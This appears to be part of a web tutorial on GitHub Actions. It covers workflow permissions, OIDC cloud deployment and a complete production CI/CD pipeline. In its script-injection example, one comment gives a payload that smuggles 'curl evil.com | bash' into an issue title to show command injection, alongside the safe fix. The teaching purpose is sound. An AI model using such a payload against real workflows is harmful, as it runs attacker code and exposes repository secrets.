<section id="security">
<h2><span class="sec-icon">🛡️</span>Workflow security</h2>
<p class="desc">Security in GitHub Actions is critical. A compromised workflow can leak secrets, modify code, or attack your infrastructure.</p>

<h3>Permissions: principle of least privilege</h3>
${code("Locking down permissions","yaml",`permissions:
  contents: read                 # Default: read-only

jobs:
  test:
    runs-on: ubuntu-latest       # Inherits read-only
    steps:
      - uses: actions/checkout@v4
      - run: pytest test_app.py -v

  publish:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write            # Only this job can push
    steps:
      - uses: actions/checkout@v4
      - run: echo "Publishing..."`)}

<h3>Preventing script injection</h3>
${code("Safe vs unsafe patterns","yaml",`# ❌ VULNERABLE: Direct interpolation of user input
- run: echo "\${{ github.event.issue.title }}"
  # If title is: test"; curl evil.com | bash; echo "
  # It executes the malicious command!

# ✅ SAFE: Use environment variable
- env:
    ISSUE_TITLE: \${{ github.event.issue.title }}
  run: echo "\$ISSUE_TITLE"
  # The value is passed as a string, not interpreted`)}

<h3>OIDC for cloud deployments</h3>
${code("Passwordless AWS deployment with OIDC","yaml",`jobs:
  deploy:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      - uses: actions/checkout@v4
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789:role/github-actions
          aws-region: us-east-1
          # No access key or secret needed!
      - run: aws s3 sync ./dist s3://my-bucket/`)}

${callout("danger","Critical security rules","<strong>1.</strong> Never use <code>pull_request_target</code> with <code>actions/checkout@v4</code> on the PR branch — it gives PR authors access to your secrets.<br><strong>2.</strong> Never interpolate untrusted input directly in <code>run:</code> — it allows command injection.<br><strong>3.</strong> Never use <code>@main</code> for third-party actions in production.<br><strong>4.</strong> Never print secrets in logs.")}
</section>

<section id="conclusion">
<h2><span class="sec-icon">🎓</span>Conclusion</h2>
<p class="desc">You've gone from zero to mastering GitHub Actions. Here's the complete production pipeline combining everything:</p>

${code("The complete production pipeline","yaml",`name: Production CI/CD Pipeline

on:
  push:
    branches: [main]
    paths-ignore: ["docs/**", "**.md"]
  pull_request:
    branches: [main]
  workflow_dispatch:
    inputs:
      force_deploy:
        type: boolean
        default: false

concurrency:
  group: pipeline-\${{ github.ref }}
  cancel-in-progress: \${{ github.event_name == 'pull_request' }}

permissions:
  contents: read

env:
  PYTHON_VERSION: "3.12"
  REGISTRY: ghcr.io
  IMAGE_NAME: \${{ github.repository }}

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with: { python-version: "3.12", cache: pip }
      - run: pip install flake8 black isort
      - run: flake8 . && black --check . && isort --check .

  test:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        python-version: ["3.11", "3.12"]
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: \${{ matrix.python-version }}
          cache: pip
      - run: pip install -r requirements.txt
      - run: pytest test_app.py --cov=. --cov-report=xml -v
      - uses: actions/upload-artifact@v4
        if: matrix.python-version == '3.12'
        with: { name: coverage, path: coverage.xml }

  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: pip install safety bandit
      - run: safety check -r requirements.txt
      - run: bandit -r . -ll

  build:
    needs: [lint, test, security]
    runs-on: ubuntu-latest
    permissions: { contents: read, packages: write }
    steps:
      - uses: actions/checkout@v4
      - uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: \${{ github.actor }}
          password: \${{ secrets.GITHUB_TOKEN }}
      - uses: docker/build-push-action@v5
        with:
          context: .
          push: \${{ github.event_name != 'pull_request' }}
          tags: ghcr.io/\${{ github.repository }}:\${{ github.sha }}

  deploy-staging:
    needs: build
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    environment: { name: staging, url: "https://staging.myapp.com" }
    concurrency: { group: deploy-staging, cancel-in-progress: false }
    steps:
      - run: echo "🚀 Deploying to staging..."

  deploy-production:
    needs: deploy-staging
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    environment: { name: production, url: "https://myapp.com" }
    concurrency: { group: deploy-production, cancel-in-progress: false }
    steps:
      - run: echo "🚀 Deploying to production!"

  notify:
    needs: [deploy-production]
    if: always()
    runs-on: ubuntu-latest
    steps:
      - run: echo "Pipeline complete! Result: \${{ needs.deploy-production.result }}"`)}
